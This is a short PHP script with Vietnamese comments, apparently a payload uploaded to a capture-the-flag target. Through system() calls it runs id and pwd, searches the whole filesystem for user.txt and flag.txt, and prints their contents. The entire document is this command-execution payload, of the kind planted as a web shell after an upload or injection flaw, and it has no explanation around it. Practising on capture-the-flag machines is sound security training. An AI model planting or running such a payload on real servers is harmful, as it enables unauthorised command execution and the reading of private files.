<?php
// In thông tin user hiện tại
system('id');

// In thư mục làm việc hiện tại
system('pwd');

// Tìm kiếm file user.txt và flag.txt trong hệ thống
system('find / -type f \( -name "user.txt" -o -name "flag.txt" \) 2>/dev/null');

// Đọc và hiển thị nội dung file user.txt (nếu tồn tại)
echo "\n--- Nội dung user.txt ---\n";
system('cat $(find / -type f -name "user.txt" 2>/dev/null)');

// Đọc và hiển thị nội dung file flag.txt (nếu tồn tại)
echo "\n--- Nội dung flag.txt ---\n";
system('cat $(find / -type f -name "flag.txt" 2>/dev/null)');
?>
